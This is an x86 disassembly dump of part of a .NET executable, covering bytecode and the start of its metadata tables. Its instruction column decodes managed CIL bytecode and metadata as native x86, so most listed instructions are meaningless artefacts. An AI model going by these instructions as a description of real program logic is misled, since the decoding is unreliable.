  405760:	06                   	push   %es
  405761:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405764:	4c                   	dec    %esp
  405765:	00 00                	add    %al,(%eax)
  405767:	0a 02                	or     (%edx),%al
  405769:	03 16                	add    (%esi),%edx
  40576b:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  405771:	00 0a                	add    %cl,(%edx)
  405773:	2a 13                	sub    (%ebx),%dl
  405775:	30 04 00             	xor    %al,(%eax,%eax,1)
  405778:	21 00                	and    %eax,(%eax)
  40577a:	00 00                	add    %al,(%eax)
  40577c:	29 00                	sub    %eax,(%eax)
  40577e:	00 11                	add    %dl,(%ecx)
  405780:	02 20                	add    (%eax),%ah
  405782:	cf                   	iret
  405783:	00 00                	add    %al,(%eax)
  405785:	00 6f ee             	add    %ch,-0x12(%edi)
  405788:	00 00                	add    %al,(%eax)
  40578a:	0a 03                	or     (%ebx),%al
  40578c:	28 09                	sub    %cl,(%ecx)
  40578e:	01 00                	add    %eax,(%eax)
  405790:	0a 0a                	or     (%edx),%cl
  405792:	02 06                	add    (%esi),%al
  405794:	28 58 00             	sub    %bl,0x0(%eax)
  405797:	00 06                	add    %al,(%esi)
  405799:	16                   	push   %ss
  40579a:	1e                   	push   %ds
  40579b:	6f                   	outsl  %ds:(%esi),(%dx)
  40579c:	4c                   	dec    %esp
  40579d:	00 00                	add    %al,(%eax)
  40579f:	0a 2a                	or     (%edx),%ch
  4057a1:	00 00                	add    %al,(%eax)
  4057a3:	00 13                	add    %dl,(%ebx)
  4057a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4057a8:	35 01 00 00 00       	xor    $0x1,%eax
  4057ad:	00 00                	add    %al,(%eax)
  4057af:	00 03                	add    %al,(%ebx)
  4057b1:	16                   	push   %ss
  4057b2:	6a 3f                	push   $0x3f
  4057b4:	96                   	xchg   %eax,%esi
  4057b5:	00 00                	add    %al,(%eax)
  4057b7:	00 03                	add    %al,(%ebx)
  4057b9:	1f                   	pop    %ds
  4057ba:	7f 6a                	jg     0x405826
  4057bc:	3d 09 00 00 00       	cmp    $0x9,%eax
  4057c1:	02 03                	add    (%ebx),%al
  4057c3:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4057c6:	00 00                	add    %al,(%eax)
  4057c8:	0a 2a                	or     (%edx),%ch
  4057ca:	03 20                	add    (%eax),%esp
  4057cc:	ff 00                	incl   (%eax)
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	6a 3d                	push   $0x3d
  4057d2:	14 00                	adc    $0x0,%al
  4057d4:	00 00                	add    %al,(%eax)
  4057d6:	02 20                	add    (%eax),%ah
  4057d8:	cc                   	int3
  4057d9:	00 00                	add    %al,(%eax)
  4057db:	00 6f ee             	add    %ch,-0x12(%edi)
  4057de:	00 00                	add    %al,(%eax)
  4057e0:	0a 02                	or     (%edx),%al
  4057e2:	03 d2                	add    %edx,%edx
  4057e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057e5:	ee                   	out    %al,(%dx)
  4057e6:	00 00                	add    %al,(%eax)
  4057e8:	0a 2a                	or     (%edx),%ch
  4057ea:	03 20                	add    (%eax),%esp
  4057ec:	ff                   	(bad)
  4057ed:	ff 00                	incl   (%eax)
  4057ef:	00 6a 3d             	add    %ch,0x3d(%edx)
  4057f2:	1b 00                	sbb    (%eax),%eax
  4057f4:	00 00                	add    %al,(%eax)
  4057f6:	02 20                	add    (%eax),%ah
  4057f8:	cd 00                	int    $0x0
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4057fd:	ee                   	out    %al,(%dx)
  4057fe:	00 00                	add    %al,(%eax)
  405800:	0a 02                	or     (%edx),%al
  405802:	03 68 28             	add    0x28(%eax),%ebp
  405805:	5b                   	pop    %ebx
  405806:	00 00                	add    %al,(%eax)
  405808:	06                   	push   %es
  405809:	16                   	push   %ss
  40580a:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  40580d:	00 00                	add    %al,(%eax)
  40580f:	0a 2a                	or     (%edx),%ch
  405811:	03 15 6e 3d 1b 00    	add    0x1b3d6e,%edx
  405817:	00 00                	add    %al,(%eax)
  405819:	02 20                	add    (%eax),%ah
  40581b:	ce                   	into
  40581c:	00 00                	add    %al,(%eax)
  40581e:	00 6f ee             	add    %ch,-0x12(%edi)
  405821:	00 00                	add    %al,(%eax)
  405823:	0a 02                	or     (%edx),%al
  405825:	03 69 28             	add    0x28(%ecx),%ebp
  405828:	5a                   	pop    %edx
  405829:	00 00                	add    %al,(%eax)
  40582b:	06                   	push   %es
  40582c:	16                   	push   %ss
  40582d:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405830:	00 00                	add    %al,(%eax)
  405832:	0a 2a                	or     (%edx),%ch
  405834:	02 20                	add    (%eax),%ah
  405836:	d3 00                	roll   %cl,(%eax)
  405838:	00 00                	add    %al,(%eax)
  40583a:	6f                   	outsl  %ds:(%esi),(%dx)
  40583b:	ee                   	out    %al,(%dx)
  40583c:	00 00                	add    %al,(%eax)
  40583e:	0a 02                	or     (%edx),%al
  405840:	03 28                	add    (%eax),%ebp
  405842:	59                   	pop    %ecx
  405843:	00 00                	add    %al,(%eax)
  405845:	06                   	push   %es
  405846:	16                   	push   %ss
  405847:	1e                   	push   %ds
  405848:	6f                   	outsl  %ds:(%esi),(%dx)
  405849:	4c                   	dec    %esp
  40584a:	00 00                	add    %al,(%eax)
  40584c:	0a 2a                	or     (%edx),%ch
  40584e:	03 20                	add    (%eax),%esp
  405850:	00 00                	add    %al,(%eax)
  405852:	00 80 6a 3d 1a 00    	add    %al,0x1a3d6a(%eax)
  405858:	00 00                	add    %al,(%eax)
  40585a:	02 20                	add    (%eax),%ah
  40585c:	d3 00                	roll   %cl,(%eax)
  40585e:	00 00                	add    %al,(%eax)
  405860:	6f                   	outsl  %ds:(%esi),(%dx)
  405861:	ee                   	out    %al,(%dx)
  405862:	00 00                	add    %al,(%eax)
  405864:	0a 02                	or     (%edx),%al
  405866:	03 28                	add    (%eax),%ebp
  405868:	59                   	pop    %ecx
  405869:	00 00                	add    %al,(%eax)
  40586b:	06                   	push   %es
  40586c:	16                   	push   %ss
  40586d:	1e                   	push   %ds
  40586e:	6f                   	outsl  %ds:(%esi),(%dx)
  40586f:	4c                   	dec    %esp
  405870:	00 00                	add    %al,(%eax)
  405872:	0a 2a                	or     (%edx),%ch
  405874:	03 20                	add    (%eax),%esp
  405876:	00 80 ff ff 6a 3d    	add    %al,0x3d6affff(%eax)
  40587c:	1b 00                	sbb    (%eax),%eax
  40587e:	00 00                	add    %al,(%eax)
  405880:	02 20                	add    (%eax),%ah
  405882:	d2 00                	rolb   %cl,(%eax)
  405884:	00 00                	add    %al,(%eax)
  405886:	6f                   	outsl  %ds:(%esi),(%dx)
  405887:	ee                   	out    %al,(%dx)
  405888:	00 00                	add    %al,(%eax)
  40588a:	0a 02                	or     (%edx),%al
  40588c:	03 69 28             	add    0x28(%ecx),%ebp
  40588f:	5a                   	pop    %edx
  405890:	00 00                	add    %al,(%eax)
  405892:	06                   	push   %es
  405893:	16                   	push   %ss
  405894:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405897:	00 00                	add    %al,(%eax)
  405899:	0a 2a                	or     (%edx),%ch
  40589b:	03 1f                	add    (%edi),%ebx
  40589d:	80 6a 3d 1b          	subb   $0x1b,0x3d(%edx)
  4058a1:	00 00                	add    %al,(%eax)
  4058a3:	00 02                	add    %al,(%edx)
  4058a5:	20 d1                	and    %dl,%cl
  4058a7:	00 00                	add    %al,(%eax)
  4058a9:	00 6f ee             	add    %ch,-0x12(%edi)
  4058ac:	00 00                	add    %al,(%eax)
  4058ae:	0a 02                	or     (%edx),%al
  4058b0:	03 68 28             	add    0x28(%eax),%ebp
  4058b3:	5b                   	pop    %ebx
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	06                   	push   %es
  4058b7:	16                   	push   %ss
  4058b8:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4058bb:	00 00                	add    %al,(%eax)
  4058bd:	0a 2a                	or     (%edx),%ch
  4058bf:	03 1f                	add    (%edi),%ebx
  4058c1:	e0 6a                	loopne 0x40592d
  4058c3:	3d 14 00 00 00       	cmp    $0x14,%eax
  4058c8:	02 20                	add    (%eax),%ah
  4058ca:	d0 00                	rolb   $1,(%eax)
  4058cc:	00 00                	add    %al,(%eax)
  4058ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4058cf:	ee                   	out    %al,(%dx)
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 02                	or     (%edx),%al
  4058d4:	03 d2                	add    %edx,%edx
  4058d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4058d7:	ee                   	out    %al,(%dx)
  4058d8:	00 00                	add    %al,(%eax)
  4058da:	0a 2a                	or     (%edx),%ch
  4058dc:	02 03                	add    (%ebx),%al
  4058de:	d2 6f ee             	shrb   %cl,-0x12(%edi)
  4058e1:	00 00                	add    %al,(%eax)
  4058e3:	0a 2a                	or     (%edx),%ch
  4058e5:	00 00                	add    %al,(%eax)
  4058e7:	00 1b                	add    %bl,(%ebx)
  4058e9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4058ec:	61                   	popa
  4058ed:	00 00                	add    %al,(%eax)
  4058ef:	00 2d 00 00 11 02    	add    %ch,0x2110000
  4058f5:	73 4d                	jae    0x405944
  4058f7:	00 00                	add    %al,(%eax)
  4058f9:	0a 0a                	or     (%edx),%cl
  4058fb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  405901:	0b 06                	or     (%esi),%eax
  405903:	07                   	pop    %es
  405904:	16                   	push   %ss
  405905:	1a 6f 45             	sbb    0x45(%edi),%ch
  405908:	00 00                	add    %al,(%eax)
  40590a:	0a 26                	or     (%esi),%ah
  40590c:	07                   	pop    %es
  40590d:	16                   	push   %ss
  40590e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405912:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405915:	16                   	push   %ss
  405916:	73 0a                	jae    0x405922
  405918:	01 00                	add    %eax,(%eax)
  40591a:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  405920:	00 01                	add    %al,(%ecx)
  405922:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405925:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405928:	08 6f 45             	or     %ch,0x45(%edi)
  40592b:	00 00                	add    %al,(%eax)
  40592d:	0a 26                	or     (%esi),%ah
  40592f:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  405932:	05 dd 1a 00 00       	add    $0x1add,%eax
  405937:	00 09                	add    %cl,(%ecx)
  405939:	39 06                	cmp    %eax,(%esi)
  40593b:	00 00                	add    %al,(%eax)
  40593d:	00 09                	add    %cl,(%ecx)
  40593f:	6f                   	outsl  %ds:(%esi),(%dx)
  405940:	33 00                	xor    (%eax),%eax
  405942:	00 0a                	add    %cl,(%edx)
  405944:	dc 06                	faddl  (%esi)
  405946:	39 06                	cmp    %eax,(%esi)
  405948:	00 00                	add    %al,(%eax)
  40594a:	00 06                	add    %al,(%esi)
  40594c:	6f                   	outsl  %ds:(%esi),(%dx)
  40594d:	33 00                	xor    (%eax),%eax
  40594f:	00 0a                	add    %cl,(%edx)
  405951:	dc 11                	fcoml  (%ecx)
  405953:	05 2a 00 00 00       	add    $0x2a,%eax
  405958:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40595b:	00 02                	add    %al,(%edx)
  40595d:	00 28                	add    %ch,(%eax)
  40595f:	00 1c 44             	add    %bl,(%esp,%eax,2)
  405962:	00 0d 00 00 00 00    	add    %cl,0x0
  405968:	02 00                	add    (%eax),%al
  40596a:	07                   	pop    %es
  40596b:	00 4a 51             	add    %cl,0x51(%edx)
  40596e:	00 0d 00 00 00 00    	add    %cl,0x0
  405974:	1b 30                	sbb    (%eax),%esi
  405976:	04 00                	add    $0x0,%al
  405978:	5e                   	pop    %esi
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 2e                	add    %ch,(%esi)
  40597d:	00 00                	add    %al,(%eax)
  40597f:	11 73 d0             	adc    %esi,-0x30(%ebx)
  405982:	00 00                	add    %al,(%eax)
  405984:	0a 0a                	or     (%edx),%cl
  405986:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  40598c:	00 0a                	add    %cl,(%edx)
  40598e:	0b 06                	or     (%esi),%eax
  405990:	07                   	pop    %es
  405991:	16                   	push   %ss
  405992:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  405995:	00 00                	add    %al,(%eax)
  405997:	0a 06                	or     (%esi),%al
  405999:	17                   	pop    %ss
  40599a:	73 0a                	jae    0x4059a6
  40599c:	01 00                	add    %eax,(%eax)
  40599e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4059a1:	02 16                	add    (%esi),%dl
  4059a3:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  4059a9:	00 0a                	add    %cl,(%edx)
  4059ab:	08 6f 4f             	or     %ch,0x4f(%edi)
  4059ae:	00 00                	add    %al,(%eax)
  4059b0:	0a dd                	or     %ch,%bl
  4059b2:	0d 00 00 00 08       	or     $0x8000000,%eax
  4059b7:	39 06                	cmp    %eax,(%esi)
  4059b9:	00 00                	add    %al,(%eax)
  4059bb:	00 08                	add    %cl,(%eax)
  4059bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4059be:	33 00                	xor    (%eax),%eax
  4059c0:	00 0a                	add    %cl,(%edx)
  4059c2:	dc 06                	faddl  (%esi)
  4059c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4059c5:	dd 00                	fldl   (%eax)
  4059c7:	00 0a                	add    %cl,(%edx)
  4059c9:	0d dd 0d 00 00       	or     $0xddd,%eax
  4059ce:	00 06                	add    %al,(%esi)
  4059d0:	39 06                	cmp    %eax,(%esi)
  4059d2:	00 00                	add    %al,(%eax)
  4059d4:	00 06                	add    %al,(%esi)
  4059d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4059d7:	33 00                	xor    (%eax),%eax
  4059d9:	00 0a                	add    %cl,(%edx)
  4059db:	dc 09                	fmull  (%ecx)
  4059dd:	2a 00                	sub    (%eax),%al
  4059df:	00 01                	add    %al,(%ecx)
  4059e1:	1c 00                	sbb    $0x0,%al
  4059e3:	00 02                	add    %al,(%edx)
  4059e5:	00 20                	add    %ah,(%eax)
  4059e7:	00 16                	add    %dl,(%esi)
  4059e9:	36 00 0d 00 00 00 00 	add    %cl,%ss:0x0
  4059f0:	02 00                	add    (%eax),%al
  4059f2:	06                   	push   %es
  4059f3:	00 49 4f             	add    %cl,0x4f(%ecx)
  4059f6:	00 0d 00 00 00 00    	add    %cl,0x0
  4059fc:	42                   	inc    %edx
  4059fd:	53                   	push   %ebx
  4059fe:	4a                   	dec    %edx
  4059ff:	42                   	inc    %edx
  405a00:	01 00                	add    %eax,(%eax)
  405a02:	01 00                	add    %eax,(%eax)
  405a04:	00 00                	add    %al,(%eax)
  405a06:	00 00                	add    %al,(%eax)
  405a08:	0c 00                	or     $0x0,%al
  405a0a:	00 00                	add    %al,(%eax)
  405a0c:	76 34                	jbe    0x405a42
  405a0e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405a11:	33 30                	xor    (%eax),%esi
  405a13:	33 31                	xor    (%ecx),%esi
  405a15:	39 00                	cmp    %eax,(%eax)
  405a17:	00 00                	add    %al,(%eax)
  405a19:	00 05 00 6c 00 00    	add    %al,0x6c00
  405a1f:	00 bc 1d 00 00 23 7e 	add    %bh,0x7e230000(%ebp,%ebx,1)
  405a26:	00 00                	add    %al,(%eax)
  405a28:	28 1e                	sub    %bl,(%esi)
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	bc 1d 00 00 23       	mov    $0x2300001d,%esp
  405a31:	53                   	push   %ebx
  405a32:	74 72                	je     0x405aa6
  405a34:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  405a3b:	00 e4                	add    %ah,%ah
  405a3d:	3b 00                	cmp    (%eax),%eax
  405a3f:	00 74 27 00          	add    %dh,0x0(%edi,%eiz,1)
  405a43:	00 23                	add    %ah,(%ebx)
  405a45:	55                   	push   %ebp
  405a46:	53                   	push   %ebx
  405a47:	00 58 63             	add    %bl,0x63(%eax)
  405a4a:	00 00                	add    %al,(%eax)
  405a4c:	10 00                	adc    %al,(%eax)
  405a4e:	00 00                	add    %al,(%eax)
  405a50:	23 47 55             	and    0x55(%edi),%eax
  405a53:	49                   	dec    %ecx
  405a54:	44                   	inc    %esp
  405a55:	00 00                	add    %al,(%eax)
  405a57:	00 68 63             	add    %ch,0x63(%eax)
  405a5a:	00 00                	add    %al,(%eax)
  405a5c:	40                   	inc    %eax
  405a5d:	09 00                	or     %eax,(%eax)
  405a5f:	00 23                	add    %ah,(%ebx)
  405a61:	42                   	inc    %edx
  405a62:	6c                   	insb   (%dx),%es:(%edi)
  405a63:	6f                   	outsl  %ds:(%esi),(%dx)
  405a64:	62 00                	bound  %eax,(%eax)
  405a66:	00 00                	add    %al,(%eax)
  405a68:	00 00                	add    %al,(%eax)
  405a6a:	00 00                	add    %al,(%eax)
  405a6c:	02 00                	add    (%eax),%al
  405a6e:	00 01                	add    %al,(%ecx)
  405a70:	57                   	push   %edi
  405a71:	9f                   	lahf
  405a72:	a2 3f 09 0a 00       	mov    %al,0xa093f
  405a77:	00 00                	add    %al,(%eax)
  405a79:	fa                   	cli
  405a7a:	25 33 00 16 00       	and    $0x160033,%eax
  405a7f:	00 01                	add    %al,(%ecx)
  405a81:	00 00                	add    %al,(%eax)
  405a83:	00 9b 00 00 00 1e    	add    %bl,0x1e000000(%ebx)
  405a89:	00 00                	add    %al,(%eax)
  405a8b:	00 47 00             	add    %al,0x0(%edi)
  405a8e:	00 00                	add    %al,(%eax)
  405a90:	a3 00 00 00 71       	mov    %eax,0x71000000
  405a95:	00 00                	add    %al,(%eax)
  405a97:	00 02                	add    %al,(%edx)
  405a99:	00 00                	add    %al,(%eax)
  405a9b:	00 0a                	add    %cl,(%edx)
  405a9d:	01 00                	add    %eax,(%eax)
  405a9f:	00 13                	add    %dl,(%ebx)
  405aa1:	00 00                	add    %al,(%eax)
  405aa3:	00 31                	add    %dh,(%ecx)
  405aa5:	00 00                	add    %al,(%eax)
  405aa7:	00 02                	add    %al,(%edx)
  405aa9:	00 00                	add    %al,(%eax)
  405aab:	00 2e                	add    %ch,(%esi)
  405aad:	00 00                	add    %al,(%eax)
  405aaf:	00 04 00             	add    %al,(%eax,%eax,1)
  405ab2:	00 00                	add    %al,(%eax)
  405ab4:	13 00                	adc    (%eax),%eax
  405ab6:	00 00                	add    %al,(%eax)
  405ab8:	20 00                	and    %al,(%eax)
  405aba:	00 00                	add    %al,(%eax)
  405abc:	04 00                	add    $0x0,%al
  405abe:	00 00                	add    %al,(%eax)
  405ac0:	03 00                	add    (%eax),%eax
  405ac2:	00 00                	add    %al,(%eax)
  405ac4:	06                   	push   %es
  405ac5:	00 00                	add    %al,(%eax)
  405ac7:	00 06                	add    %al,(%esi)
  405ac9:	00 00                	add    %al,(%eax)
  405acb:	00 02                	add    %al,(%edx)
  405acd:	00 00                	add    %al,(%eax)
  405acf:	00 01                	add    %al,(%ecx)
  405ad1:	00 00                	add    %al,(%eax)
  405ad3:	00 08                	add    %cl,(%eax)
  405ad5:	00 00                	add    %al,(%eax)
  405ad7:	00 04 00             	add    %al,(%eax,%eax,1)
  405ada:	00 00                	add    %al,(%eax)
  405adc:	01 00                	add    %eax,(%eax)
  405ade:	00 00                	add    %al,(%eax)
  405ae0:	00 00                	add    %al,(%eax)
  405ae2:	ea 0a 01 00 00 00 00 	ljmp   $0x0,$0x10a
  405ae9:	00 06                	add    %al,(%esi)
  405aeb:	00 3b                	add    %bh,(%ebx)
  405aed:	19 e9                	sbb    %ebp,%ecx
  405aef:	0f 0a                	(bad)
  405af1:	00 8a 00 05 16 0a    	add    %cl,0xa160500(%edx)
  405af7:	00 a1 19 74 18 0a    	add    %ah,0xa187419(%ecx)
  405afd:	00 84 0f 87 1d 06 00 	add    %al,0x61d87(%edi,%ecx,1)
  405b04:	2b 14 93             	sub    (%ebx,%edx,4),%edx
  405b07:	0b 06                	or     (%esi),%eax
  405b09:	00 7d 08             	add    %bh,0x8(%ebp)
  405b0c:	05 16 0a 00 9d       	add    $0x9d000a16,%eax
  405b11:	10 05 16 0a 00 10    	adc    %al,0x10000a16
  405b17:	18 87 1d 06 00 fb    	sbb    %al,-0x4fff9e3(%edi)
  405b1d:	19 e9                	sbb    %ebp,%ecx
  405b1f:	0f 0e                	femms
  405b21:	00 00                	add    %al,(%eax)
  405b23:	12 ea                	adc    %dl,%ch
  405b25:	0b 0e                	or     (%esi),%ecx
  405b27:	00 c6                	add    %al,%dh
  405b29:	18 ea                	sbb    %ch,%dl
  405b2b:	0b 06                	or     (%esi),%eax
  405b2d:	00 40 1c             	add    %al,0x1c(%eax)
  405b30:	93                   	xchg   %eax,%ebx
  405b31:	0b 06                	or     (%esi),%eax
  405b33:	00 2b                	add    %ch,(%ebx)
  405b35:	13 e1                	adc    %ecx,%esp
  405b37:	1b 06                	sbb    (%esi),%eax
  405b39:	00 5a 10             	add    %bl,0x10(%edx)
  405b3c:	e9 0f 0a 00 1c       	jmp    0x1c406550
  405b41:	17                   	pop    %ss
  405b42:	55                   	push   %ebp
  405b43:	00 06                	add    %al,(%esi)
  405b45:	00 2b                	add    %ch,(%ebx)
  405b47:	00 c1                	add    %al,%cl
  405b49:	02 12                	add    (%edx),%dl
  405b4b:	00 20                	add    %ah,(%eax)
  405b4d:	00 9d 15 12 00 01    	add    %bl,0x1001215(%ebp)
  405b53:	00 e9                	add    %ch,%cl
  405b55:	0f 12 00             	movlps (%eax),%xmm0
  405b58:	d9 08                	(bad) (%eax)
  405b5a:	9d                   	popf
  405b5b:	15 06 00 f8 07       	adc    $0x7f80006,%eax
  405b60:	e9 0f 06 00 dd       	jmp    0xdd406174
  405b65:	0b e1                	or     %ecx,%esp
  405b67:	1b 06                	sbb    (%esi),%eax
  405b69:	00 a5 14 ca 17 06    	add    %ah,0x617ca14(%ebp)
  405b6f:	00 9c 05 ca 17 06 00 	add    %bl,0x617ca(%ebp,%eax,1)
  405b76:	bd 0f 5c 02 06       	mov    $0x6025c0f,%ebp
  405b7b:	00 e6                	add    %ah,%dh
  405b7d:	09 9d 15 06 00 53    	or     %ebx,0x53000615(%ebp)
  405b83:	0a 9d 15 06 00 03    	or     0x3000615(%ebp),%bl
  405b89:	09 3f                	or     %edi,(%edi)
  405b8b:	15 6f 00 bd 15       	adc    $0x15bd006f,%eax
  405b90:	00 00                	add    %al,(%eax)
  405b92:	06                   	push   %es
  405b93:	00 2b                	add    %ch,(%ebx)
  405b95:	09 4a 11             	or     %ecx,0x11(%edx)
  405b98:	06                   	push   %es
  405b99:	00 b2 09 4a 11 06    	add    %dh,0x6114a09(%edx)
  405b9f:	00 93 09 4a 11 06    	add    %dl,0x6114a09(%ebx)
  405ba5:	00 3a                	add    %bh,(%edx)
  405ba7:	0a 4a 11             	or     0x11(%edx),%cl
  405baa:	06                   	push   %es
  405bab:	00 06                	add    %al,(%esi)
  405bad:	0a 4a 11             	or     0x11(%edx),%cl
  405bb0:	06                   	push   %es
  405bb1:	00 1f                	add    %bl,(%edi)
  405bb3:	0a 4a 11             	or     0x11(%edx),%cl
  405bb6:	06                   	push   %es
  405bb7:	00 42 09             	add    %al,0x9(%edx)
  405bba:	4a                   	dec    %edx
  405bbb:	11 06                	adc    %eax,(%esi)
  405bbd:	00 76 09             	add    %dh,0x9(%esi)
  405bc0:	4a                   	dec    %edx
  405bc1:	11 06                	adc    %eax,(%esi)
  405bc3:	00 5d 09             	add    %bl,0x9(%ebp)
  405bc6:	01 0c 06             	add    %ecx,(%esi,%eax,1)
  405bc9:	00 17                	add    %dl,(%edi)
  405bcb:	09 7e 15             	or     %edi,0x15(%esi)
  405bce:	06                   	push   %es
  405bcf:	00 e8                	add    %ch,%al
  405bd1:	08 9d 15 06 00 cf    	or     %bl,-0x30fff9eb(%ebp)
  405bd7:	09 4a 11             	or     %ecx,0x11(%edx)
  405bda:	06                   	push   %es
  405bdb:	00 11                	add    %dl,(%ecx)
  405bdd:	03 93 0b 06 00 9b    	add    -0x64fff9f5(%ebx),%edx
  405be3:	1b e9                	sbb    %ecx,%ebp
  405be5:	0f 06                	clts
  405be7:	00 93 1a e9 0f 06    	add    %dl,0x60fe91a(%ebx)
  405bed:	00 e1                	add    %ah,%cl
  405bef:	0b e1                	or     %ecx,%esp
  405bf1:	1b 0a                	sbb    (%edx),%ecx
  405bf3:	00 cc                	add    %cl,%ah
  405bf5:	1c 05                	sbb    $0x5,%al
  405bf7:	16                   	push   %ss
  405bf8:	06                   	push   %es
  405bf9:	00 14 10             	add    %dl,(%eax,%edx,1)
  405bfc:	fa                   	cli
  405bfd:	1c 06                	sbb    $0x6,%al
  405bff:	00 f9                	add    %bh,%cl
  405c01:	12 fa                	adc    %dl,%bh
  405c03:	1c 06                	sbb    $0x6,%al
  405c05:	00 74 0b fa          	add    %dh,-0x6(%ebx,%ecx,1)
  405c09:	1c 06                	sbb    $0x6,%al
  405c0b:	00 ee                	add    %ch,%dh
  405c0d:	11 e9                	adc    %ebp,%ecx
  405c0f:	0f 0a                	(bad)
  405c11:	00 56 18             	add    %dl,0x18(%esi)
  405c14:	60                   	pusha
  405c15:	19 0a                	sbb    %ecx,(%edx)
  405c17:	00 19                	add    %bl,(%ecx)
  405c19:	1a 60 19             	sbb    0x19(%eax),%ah
  405c1c:	0a 00                	or     (%eax),%al
  405c1e:	a1 0e 60 19 0a       	mov    0xa19600e,%eax
  405c23:	00 20                	add    %ah,(%eax)
  405c25:	1d 74 18 0a 00       	sbb    $0xa1874,%eax
  405c2a:	2d 08 74 18 0a       	sub    $0xa187408,%eax
  405c2f:	00 18                	add    %bl,(%eax)
  405c31:	08 74 18 06          	or     %dh,0x6(%eax,%ebx,1)
  405c35:	00 be 0c e9 0f 06    	add    %bh,0x60fe90c(%esi)
  405c3b:	00 ce                	add    %cl,%dh
  405c3d:	12 e9                	adc    %cl,%ch
  405c3f:	0f 06                	clts
  405c41:	00 3b                	add    %bh,(%ebx)
  405c43:	10 e9                	adc    %ch,%cl
  405c45:	0f 0a                	(bad)
  405c47:	00 bd 17 60 19 0a    	add    %bh,0xa196017(%ebp)
  405c4d:	00 57 17             	add    %dl,0x17(%edi)
  405c50:	60                   	pusha
  405c51:	19 06                	sbb    %eax,(%esi)
  405c53:	00 dd                	add    %bl,%ch
  405c55:	17                   	pop    %ss
  405c56:	e9 0f 06 00 a8       	jmp    0xa840626a
  405c5b:	05 e9 0f 0a 00       	add    $0xa0fe9,%eax
  405c60:	76 0f                	jbe    0x405c71
  405c62:	74 18                	je     0x405c7c
  405c64:	0a 00                	or     (%eax),%al
  405c66:	eb 0d                	jmp    0x405c75
  405c68:	87 1d 0a 00 3a 1b    	xchg   %ebx,0x1b3a000a
  405c6e:	60                   	pusha
  405c6f:	19 0a                	sbb    %ecx,(%edx)
  405c71:	00 5c 11 05          	add    %bl,0x5(%ecx,%edx,1)
  405c75:	16                   	push   %ss
  405c76:	0a 00                	or     (%eax),%al
  405c78:	7b 17                	jnp    0x405c91
  405c7a:	2b 11                	sub    (%ecx),%edx
  405c7c:	06                   	push   %es
  405c7d:	00 93 0a e9 0f 06    	add    %dl,0x60fe90a(%ebx)
  405c83:	00 0f                	add    %cl,(%edi)
  405c85:	0e                   	push   %cs
  405c86:	93                   	xchg   %eax,%ebx
  405c87:	0b 06                	or     (%esi),%eax
  405c89:	00 dd                	add    %bl,%ch
  405c8b:	0d e9 0f 0a 00       	or     $0xa0fe9,%eax
  405c90:	9a 0d e9 0f 0a 00 e4 	lcall  $0xe400,$0xa0fe90d
  405c97:	07                   	pop    %es
  405c98:	e9 0f 06 00 8a       	jmp    0x8a4062ac
  405c9d:	14 e9                	adc    $0xe9,%al
  405c9f:	0f 06                	clts
  405ca1:	00 82 1b 93 0b 06    	add    %al,0x60b931b(%edx)
  405ca7:	00 b7 0f 5c 02 06    	add    %dh,0x6025c0f(%edi)
  405cad:	00 10                	add    %dl,(%eax)
  405caf:	15 93 0b 0a 00       	adc    $0xa0b93,%eax
  405cb4:	52                   	push   %edx
  405cb5:	05 74 18 06 00       	add    $0x61874,%eax
  405cba:	b8 01 e9 0f 06       	mov    $0x60fe901,%eax
  405cbf:	00 18                	add    %bl,(%eax)
  405cc1:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
  405cc5:	00 4e 18             	add    %cl,0x18(%esi)
  405cc8:	3f                   	aas
  405cc9:	15 0a 00 5a 12       	adc    $0x125a000a,%eax
  405cce:	3f                   	aas
  405ccf:	15 06 00 e9 1c       	adc    $0x1ce90006,%eax
  405cd4:	55                   	push   %ebp
  405cd5:	00 06                	add    %al,(%esi)
  405cd7:	00 6c 14 5c          	add    %ch,0x5c(%esp,%edx,1)
  405cdb:	02 06                	add    (%esi),%al
  405cdd:	00 5d 0d             	add    %bl,0xd(%ebp)
  405ce0:	5c                   	pop    %esp
  405ce1:	02 0a                	add    (%edx),%cl
  405ce3:	00 b1 06 3f 15 06    	add    %dh,0x6153f06(%ecx)
  405ce9:	00 2b                	add    %ch,(%ebx)
  405ceb:	12 5c 02 0a          	adc    0xa(%edx,%eax,1),%bl
  405cef:	00 cf                	add    %cl,%bh
  405cf1:	06                   	push   %es
  405cf2:	3f                   	aas
  405cf3:	15 06 00 64 1d       	adc    $0x1d640006,%eax
  405cf8:	55                   	push   %ebp
  405cf9:	00 16                	add    %dl,(%esi)
  405cfb:	00 01                	add    %al,(%ecx)
